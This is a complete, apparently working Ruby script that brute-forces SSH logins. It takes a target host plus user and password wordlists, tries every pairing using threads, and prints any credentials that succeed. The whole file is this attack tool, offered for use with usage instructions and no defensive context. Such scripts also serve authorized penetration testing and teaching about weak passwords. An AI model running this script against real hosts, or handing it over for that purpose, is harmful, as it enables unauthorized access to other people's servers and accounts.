#!/usr/bin/env ruby

# AUGUSTO SAVI |@Augusto_Savi

require 'net/ssh'

@threads = []
@accepts = []
@users = []
@passwords = []

hosts = ARGV[0]
users_path = ARGV[1]
passs_path = ARGV[2]


def verifyArgs(hosts,users_path,passs_path)
    if !hosts || !users_path || ! passs_path
        puts "[!] correct usage: rb bruteForceSSH.rb host path_to_users_file path_to_passwords_file"
        puts "[!] exemple: rb bruteForceSSH.rb 192.168.0.1 ./users.txt ./passwords.txt"
    end
    begin

      users_file = File.open(users_path)
      @users = users_file.readlines.map(&:chomp)
      users_file.close
      
      passs_file = File.open(passs_path)
      @passwords = passs_file.readlines.map(&:chomp)
      passs_file.close

      if @users.empty?
        puts "file with empty users"
      end
      if @passwords.empty?
        puts "file with empty passwords"
      end

    rescue
      puts "error open files"
    end
end

def attack_ssh(host, user, password, port=22, timeout = 5)
  begin
    Net::SSH.start(host, user, :password => password,
                   :auth_methods => ["password"], :port => port,
                  :non_interactive => true, :timeout => timeout ) do |session|
      puts "Password Found: #{host} | #{user}:#{password}"
      session.close unless session.nil?
      @accepts.push({'host' => host,'user' => user, 'password' => password})
  end

  rescue Net::SSH::Disconnect
    puts "[!] The remote '#{host}' has disconnected unexpectedly"
  rescue Net::SSH::ConnectionTimeout
    puts "[!] The host '#{host}' not alive!"
  rescue Net::SSH::Timeout
    puts "[!] The host '#{host}' disconnected/timeouted unexpectedly!"
  rescue Errno::ECONNREFUSED
    puts "[!] Incorrect port #{port} for #{host}"
  rescue Net::SSH::AuthenticationFailed
    puts "[!] Wrong Password: #{host} | #{user}:#{password}"
  rescue Net::SSH::Authentication::DisallowedMethod
    puts "[!] The host '#{host}' doesn't accept password authentication method."
  rescue Errno::EHOSTUNREACH
    puts "[!] No route to host: '#{host}'"
  rescue Errno::ECONNRESET
    puts "[!] Connection reset by peer: '#{host}'"
  rescue SocketError => ex
    puts ex.inspect
  end
end

verifyArgs(hosts,users_path,passs_path)

puts "Users list size: #{@users.length()}"
puts "Passwords list size: #{@passwords.length()}"

@users.each do |user|
  @passwords.each do |password|
    sleep(0.1)
    @threads << Thread.new { attack_ssh(hosts, user, password) }
  end 
end

@threads.each { |thr| thr.join }

puts "accepts #{@accepts.length()}"
@accepts.each { |accept| puts accept }